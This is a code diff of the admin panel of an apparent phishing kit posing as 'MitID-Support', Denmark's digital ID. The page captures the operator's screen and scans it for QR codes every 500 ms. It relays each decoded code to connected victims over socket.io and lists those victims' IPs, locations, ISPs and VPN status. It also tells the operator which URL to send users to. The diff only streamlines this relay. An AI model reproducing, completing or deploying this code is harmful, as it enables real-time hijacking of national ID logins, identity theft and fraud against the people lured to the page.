@@ -9,7 +9,6 @@
   <script src="/socket.io/socket.io.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
-
   <style>
     body { background:#f8f9fa; }
     .container { max-width:1100px; }
@@ -24,7 +23,6 @@
       <img src="https://i.postimg.cc/WzDHPTPX/logo.jpg" alt="logo" style="width:50px;height:auto;margin-right:12px;">
       <h3 class="m-0">MitID-Support — Admin Panel</h3>
     </div>
-    
     <div class="alert alert-info">
       Instruct users to navigate to: <strong><span id="siteUrl"></span></strong>
     </div>
@@ -34,24 +32,10 @@
       <button id="stop" class="btn btn-danger">Stop Stream</button>
       <button id="hide" class="btn btn-warning">Hide QR</button>
       <button id="show" class="btn btn-info">Show QR</button>
-      <button id="freeze" class="btn btn-secondary">Freeze Scan</button>
-      <button id="unfreeze" class="btn btn-light">Unfreeze Scan</button>
-    </div>
-
-    <div class="mb-3">
-      <p>Status: <span id="status">Idle</span></p>
-      <p>Hidden: <span id="hiddenStatus">No</span></p>
-      <p>Frozen: <span id="frozenStatus">No</span></p>
-      <p>Admin ping: <span id="adminPing">0</span> ms</p>
-      <p>Scan interval: <span id="scanIntervalDisplay">500</span> ms</p>
-      <div class="input-group mb-2" style="max-width:320px">
-        <input id="scanIntervalInput" class="form-control" placeholder="Scan interval (ms)" type="number" min="100" max="5000"/>
-        <button id="setScanInterval" class="btn btn-outline-primary">Set</button>
-      </div>
     </div>
 
     <h5>Connected Clients (<span id="clientCount">0</span>)</h5>
-    <div id="clientListContainer" class="mb-3" style="max-height: 240px; overflow-y: auto;">
+    <div class="mb-3" style="max-height: 240px; overflow-y: auto;">
       <table class="table table-striped table-sm">
         <thead>
           <tr>
@@ -62,22 +46,18 @@
             <th>Country</th>
             <th>ISP</th>
             <th>VPN</th>
-            <th>Ping (ms)</th>
-            <th>Socket ID</th>
+            <th>Ping</th>
           </tr>
         </thead>
         <tbody id="clientListBody"></tbody>
       </table>
     </div>
-    <button id="refreshList" class="btn btn-outline-secondary mb-3">Refresh Client List</button>
 
     <h5>QR Preview</h5>
     <div id="qrCanvas"></div>
-
     <h5 class="mt-3">Screen Capture Preview</h5>
     <video id="video" width="640" height="360" autoplay style="border:1px solid #ccc"></video>
     <canvas id="canvas" width="1280" height="720" style="display:none"></canvas>
-
     <h5 class="mt-3">Debug Log</h5>
     <div id="debugLog"></div>
   </div>
@@ -86,147 +66,78 @@
 (() => {
   const socket = io();
   socket.emit('join', 'admin');
-
-  document.getElementById('siteUrl').textContent = window.location.origin;
-  const statusEl = document.getElementById('status');
-  const hiddenStatusEl = document.getElementById('hiddenStatus');
-  const frozenStatusEl = document.getElementById('frozenStatus');
-  const adminPingEl = document.getElementById('adminPing');
+  const debugLog = document.getElementById('debugLog');
+  const qrCanvasDiv = document.getElementById('qrCanvas');
   const clientListBody = document.getElementById('clientListBody');
   const clientCountEl = document.getElementById('clientCount');
-  const qrCanvasDiv = document.getElementById('qrCanvas');
-  const debugLog = document.getElementById('debugLog');
-  const scanIntervalDisplay = document.getElementById('scanIntervalDisplay');
+  document.getElementById('siteUrl').textContent = window.location.origin;
 
-  let stream = null;
-  let detectionInterval = null;
-  let lastQrValue = null;
-  let scanIntervalMs = localStorage.getItem('scanIntervalMs') ? parseInt(localStorage.getItem('scanIntervalMs')) : 500;
-  let isFrozen = localStorage.getItem('isFrozen') === 'true';
-  let isHidden = localStorage.getItem('isHidden') === 'true';
+  function log(msg){const p=document.createElement('p');p.textContent=new Date().toLocaleTimeString()+' - '+msg;debugLog.appendChild(p);debugLog.scrollTop=debugLog.scrollHeight;}
 
-  function log(msg) {
-    const p = document.createElement('p');
-    p.textContent = `${new Date().toLocaleTimeString()} - ${msg}`;
-    debugLog.appendChild(p);
-    if (debugLog.children.length > 300) debugLog.removeChild(debugLog.firstChild);
-    debugLog.scrollTop = debugLog.scrollHeight;
-  }
-
-  document.getElementById('start').addEventListener('click', startStream);
-  document.getElementById('stop').addEventListener('click', stopStream);
-  document.getElementById('hide').addEventListener('click', () => toggleHide(true));
-  document.getElementById('show').addEventListener('click', () => toggleHide(false));
-  document.getElementById('freeze').addEventListener('click', freezeScan);
-  document.getElementById('unfreeze').addEventListener('click', unfreezeScan);
-  document.getElementById('setScanInterval').addEventListener('click', () => {
-    const v = parseInt(document.getElementById('scanIntervalInput').value);
-    if (!v || v < 100 || v > 5000) return alert('Enter 100-5000 ms');
-    scanIntervalMs = v;
-    localStorage.setItem('scanIntervalMs', String(v));
-    scanIntervalDisplay.textContent = v;
-    if (detectionInterval) {
-      clearInterval(detectionInterval);
-      detectionInterval = setInterval(detectQr, scanIntervalMs);
-    }
-    log('Scan interval set to ' + v + ' ms');
-    document.getElementById('scanIntervalInput').value = '';
-  });
-
-  document.getElementById('refreshList').addEventListener('click', () => socket.emit('request_client_list'));
+  document.getElementById('start').onclick = () => startStream();
+  document.getElementById('stop').onclick = () => stopStream();
+  document.getElementById('hide').onclick = () => socket.emit('toggle_hide', true);
+  document.getElementById('show').onclick = () => socket.emit('toggle_hide', false);
 
   socket.on('client_list', (list) => {
     clientListBody.innerHTML = '';
     clientCountEl.textContent = list.length;
     list.forEach(c => {
       const tr = document.createElement('tr');
-      const isGuest = c.username.includes('Not logged in yet');
-      tr.className = isGuest ? 'gray' : '';
+      if (c.username.includes('Not logged')) tr.classList.add('gray');
       tr.innerHTML = `
         <td>${c.username}</td>
-        <td>${c.ip || ''}</td>
-        <td>${c.city || ''}</td>
-        <td>${c.region || ''}</td>
-        <td>${(c.countryFlag ? c.countryFlag + ' ' : '') + (c.country || '')}</td>
-        <td>${c.isp || ''}</td>
-        <td>${c.vpn ? '✅' : '❌'}</td>
-        <td>${c.ping}</td>
-        <td>${c.id}</td>
-      `;
+        <td>${c.ip||''}</td>
+        <td>${c.city||''}</td>
+        <td>${c.region||''}</td>
+        <td>${(c.countryFlag||'')+' '+(c.country||'')}</td>
+        <td>${c.isp||''}</td>
+        <td>${c.vpn?'✅':'❌'}</td>
+        <td>${c.ping||''}</td>`;
       clientListBody.appendChild(tr);
     });
   });
 
-  socket.on('ping', (startTime) => socket.emit('pong', startTime));
-  socket.on('your_ping', (p) => adminPingEl.textContent = p);
-  socket.on('error', (m) => alert(m));
+  socket.on('qr_preview', v => {
+    qrCanvasDiv.innerHTML='';
+    if(v)new QRCode(qrCanvasDiv,{text:v,width:128,height:128});
+  });
 
-  // The rest of your QR scanning & stream logic remains unchanged below...
-  async function startStream() {
-    try {
-      stream = await navigator.mediaDevices.getDisplayMedia({
-        video: { width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } }
-      });
-      const videoEl = document.getElementById('video');
-      videoEl.muted = true;
-      videoEl.srcObject = stream;
-      const p = videoEl.play();
-      if (p && p.catch) p.catch(e => log('Video play promise rejected: ' + e));
+  socket.on('ping', t => socket.emit('pong', t));
+
+  async function startStream(){
+    try{
+      const stream=await navigator.mediaDevices.getDisplayMedia({video:true});
+      const video=document.getElementById('video');
+      video.srcObject=stream;video.muted=true;await video.play();
+      log('Screen sharing started');
+      detectLoop(stream);
       socket.emit('start_stream');
-      statusEl.textContent = 'Streaming';
-      if (!isFrozen) detectionInterval = setInterval(detectQr, scanIntervalMs);
-      log('Stream started');
-    } catch (err) {
-      log('Screen share failed: ' + (err.message || err));
-      alert('Screen share failed: ' + (err.message || err));
-    }
+    }catch(e){log('Error: '+e.message);}
   }
 
-  function stopStream() {
-    if (stream) {
-      stream.getTracks().forEach(t => t.stop());
-      stream = null;
-    }
-    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
+  function stopStream(){
+    const v=document.getElementById('video');
+    if(v.srcObject)v.srcObject.getTracks().forEach(t=>t.stop());
     socket.emit('stop_stream');
-    statusEl.textContent = 'Idle';
     log('Stream stopped');
   }
 
-  function detectQr() {
-    const video = document.getElementById('video');
-    if (!video || !video.videoWidth) return;
-    const canvas = document.getElementById('canvas');
-    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = ctx.getImageData(0,0,canvas.width,canvas.height);
-    const code = jsQR(imageData.data, imageData.width, imageData.height);
-    if (code && code.data && code.data !== lastQrValue) {
-      lastQrValue = code.data;
-      qrCanvasDiv.innerHTML = '';
-      new QRCode(qrCanvasDiv, { text: code.data, width: 128, height:128 });
-      socket.emit('qr_update', code.data);
-      log('Detected new QR: ' + code.data);
-    }
-  }
-
-  function toggleHide(h) {
-    isHidden = !!h;
-    localStorage.setItem('isHidden', String(isHidden));
-    socket.emit('toggle_hide', isHidden);
-    hiddenStatusEl.textContent = isHidden ? 'Yes' : 'No';
-  }
-
-  function freezeScan() {
-    if (detectionInterval) { clearInterval(detectionInterval); detectionInterval = null; }
-    isFrozen = true; localStorage.setItem('isFrozen','true');
-    frozenStatusEl.textContent = 'Yes';
-  }
-  function unfreezeScan() {
-    isFrozen = false; localStorage.setItem('isFrozen','false');
-    frozenStatusEl.textContent = 'No';
-    if (stream && !detectionInterval) detectionInterval = setInterval(detectQr, scanIntervalMs);
+  async function detectLoop(stream){
+    const video=document.getElementById('video');
+    const canvas=document.getElementById('canvas');
+    const ctx=canvas.getContext('2d');
+    setInterval(()=>{
+      if(!video.videoWidth)return;
+      canvas.width=video.videoWidth;canvas.height=video.videoHeight;
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      const img=ctx.getImageData(0,0,canvas.width,canvas.height);
+      const code=jsQR(img.data,img.width,img.height);
+      if(code&&code.data){
+        socket.emit('qr_update',code.data);
+        log('QR detected: '+code.data);
+      }
+    },500);
   }
 })();
 </script>
